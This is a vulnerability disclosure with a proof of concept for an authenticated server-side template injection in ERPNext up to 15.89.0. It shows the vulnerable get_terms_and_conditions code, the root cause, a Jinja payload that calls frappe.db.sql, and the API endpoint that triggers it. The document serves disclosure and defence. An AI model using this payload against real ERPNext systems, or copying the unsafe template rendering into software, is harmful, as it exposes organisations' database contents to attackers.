**SSTI on ERPNEXT ≤ 15.89.0 (CVE-2025-66436)**

**Exploit Author: An Chu ( aka iamanc )**

**Vendor:** Frappe Technologies Pvt. Ltd.

**Product:** ERPNext

**Affected Versions:** ERPNext ≤ 15.89.0

**CVE:  CVE‑2025‑66436**

**Impact:** 

An authenticated attacker can exploit this vulnerability to execute arbitrary SQL queries via server-side template injection, resulting in disclosure of sensitive database information.

**Summary**:

An **authenticated SSTI (Server-Side Template Injection)** vulnerability exists in the `get_terms_and_conditions` method of ERPNext. The function renders attacker-controlled Jinja2 templates (`terms`) using `frappe.render_template()` with a user-supplied context (`doc`). Although Frappe uses a custom `SandboxedEnvironment`, several dangerous globals such as `frappe.db.sql` are still available in the execution context via `get_safe_globals()`.

An attacker with access to create or modify a `Terms and Conditions` document can inject arbitrary Jinja expressions into the `terms` field, resulting in server-side code execution within a restricted but still unsafe context. This vulnerability can be used to leak database information.

**Technical Details:**

ERPNext is an open-source ERP system built on the Frappe Framework, which is written in Python and uses MariaDB/MySQL as its backend database.

**HTTP Routing in Frappe**

- Frappe exposes backend Python functions through HTTP endpoints.
- The endpoint format is :

```php
/api/method/<python.module.path>.<function_name>
```

•  When a request is sent to this URL, Frappe resolves the module path and **executes the corresponding Python function directly**.

**@frappe.whitelist()**

- The `@frappe.whitelist()` decorator **exposes a Python function as a public HTTP API**.
- Whitelisted functions:
    - Accept parameters directly from user-controlled HTTP requests
    - Do not enforce input validation by default
- This decorator defines the **attack entry point** for this vulnerability.

Example: 

Source code

```php
@frappe.whitelist()
def test(a, b):
    return a + b
```

Request

```php
POST /api/method/module.test
a=1&b=2
```

**Vulnerable Template Rendering:**

frappe uses frappe.render_template(template, context) to render Jinja2 templates. Even with SandboxedEnvironment, dangerous globals remain:

```php
from frappe import render_template, get_safe_globals

render_template(user_template, user_context)
```

`get_safe_globals()` exposes:

- frappe.db.sql
- frappe.get_doc
- frappe.throw
- frappe.local

If a malicious Jinja expression is injected, attacker can execute Python code in this restricted environment and query the database.

**Vulnerable Functions Analysis:**

**Vulnerable source code:**

File /erpnext/setup/doctype/terms_and_conditions/terms_and_conditions.py

```python
@frappe.whitelist()
def get_terms_and_conditions(template_name, doc):
	if isinstance(doc, str):
		doc = json.loads(doc)

	terms_and_conditions = frappe.get_doc("Terms and Conditions", template_name)

	if terms_and_conditions.terms:
		return frappe.render_template(terms_and_conditions.terms, doc)
```

**Root Cause**

```python
frappe.render_template(terms_and_conditions.terms, doc)
```

- `terms` is loaded directly from the **Terms and Conditions** doctype.
- This field is fully **user‑controlled** by authenticated users with permission to create or edit Contract Templates.
- The value is rendered using `frappe.render_template()` **without sanitization or sandbox hardening**.
- The Jinja2 execution context exposes unsafe globals via `get_safe_globals()`, including `frappe.db.sql`.

As a result, an authenticated attacker can inject arbitrary Jinja2 expressions, leading to **Server‑Side Template Injection (SSTI)**.

**PoC:**

### Step 1: Inject SSTI Payload via UI

Navigate to:

```
New Terms and Conditions
```

Set **Terms** to:

```
{{ frappe.db.sql("SELECT @@version") }} //iamanc
```

Save the document.

<img width="623" height="400" alt="image" src="https://github.com/user-attachments/assets/f9ff7d48-2d54-49ac-b1c0-0bd5f2f0efe9" />


At this stage, the payload is stored but not yet executed.

<img width="2048" height="400" alt="image" src="https://github.com/user-attachments/assets/1a246d46-256c-425f-8a1c-9b754e5ae088" />


---

### Step 2: Direct API Invocation

The same vulnerability can be triggered by calling the whitelisted method directly:

```
POST /api/method/erpnext.setup.doctype.terms_and_conditions.terms_and_conditions.get_terms_and_conditions
```

When the request is processed, the injected `terms`payload is rendered and executed, and the evaluated output is returned in the response.

<img width="2048" height="400" alt="image" src="https://github.com/user-attachments/assets/503bc861-fbc5-4d02-bd22-1588f4b3430b" />
